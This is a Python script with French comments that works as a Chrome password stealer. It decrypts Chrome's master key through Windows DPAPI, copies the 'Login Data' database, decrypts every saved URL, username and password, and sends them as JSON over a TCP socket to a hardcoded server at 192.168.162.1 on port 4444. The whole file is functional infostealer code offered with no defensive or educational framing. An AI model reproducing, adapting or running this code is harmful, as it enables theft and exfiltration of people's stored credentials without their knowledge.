import sqlite3
import os
import json
import base64

# from Cryptodome.Cipher import AES
from Cryptodome.Cipher import AES
# from crypt import AES
import win32crypt
import socket
import json
from datetime import datetime

# Configuration du serveur
SERVER_IP = "192.168.162.1"
SERVER_PORT = 4444

# Fonction pour récupérer la clé principale
def get_master_key():
    local_state_path = os.path.expanduser(
        r"~\AppData\Local\Google\Chrome\User Data\Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Retirer le préfixe "DPAPI"
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

# Fonction pour décripter les mots de passe
def decrypt_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return "Impossible de décrypter"

# Fonction pour récupérer les mots de passe depuis Chrome
def get_chrome_passwords():
    db_path = os.path.expanduser(
        r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    )
    if not os.path.exists(db_path):
        print("Base de données non trouvée.")
        return []

    # Copier la base de données pour éviter les erreurs de verrouillage
    temp_db_path = "temp_login_data.db"
    os.system(f'copy "{db_path}" "{temp_db_path}"')

    master_key = get_master_key()
    passwords = []
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        url, username, encrypted_password = row
        if encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, master_key)
        else:
            decrypted_password = "Aucun mot de passe"
        passwords.append({"url": url, "username": username, "password": decrypted_password})

    conn.close()
    os.remove(temp_db_path)
    return passwords

# Fonction pour envoyer les mots de passe au serveur
def send_passwords_to_server(passwords):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))

        payload = json.dumps({
            "type": "passwords",
            "data": passwords,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        client_socket.send(payload.encode('utf-8'))
        client_socket.close()
        print("Identifiants envoyés au serveur.")
    except Exception as e:
        print(f"Erreur lors de l'envoi des données au serveur : {e}")

# Fonction principale
def main():
    passwords = get_chrome_passwords()
    if passwords:
        send_passwords_to_server(passwords)
    else:
        print("Aucun mot de passe récupéré.")

if __name__ == "__main__":
    main()
